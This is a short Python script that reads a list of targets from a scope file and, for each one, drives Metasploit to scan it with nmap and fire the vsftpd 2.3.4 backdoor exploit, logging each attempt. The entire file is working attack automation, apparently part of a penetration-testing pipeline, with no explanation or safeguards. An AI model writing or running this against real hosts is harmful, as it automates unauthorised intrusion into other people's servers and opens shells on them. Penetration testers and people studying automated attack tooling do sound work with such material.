import json
import subprocess
import logging

def exploit(targets, tools):
    for target in targets:
        try:
            subprocess.run([tools['msfconsole'], "-q", "-x", f"db_nmap -sV {target}; search exploit; use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST {target}; exploit"], capture_output=True, text=True)
            logging.info(f"Exploitation attempted for {target}")
        except Exception as e:
            logging.error(f"Error during exploitation for {target}: {e}")

def run():
    logging.info("Exploitation started")
    with open('scope.json', 'r') as file:
        scope = json.load(file)
    exploit(scope["targets"], scope["tools"])
    logging.info("Exploitation completed")

if __name__ == "__main__":
    run()
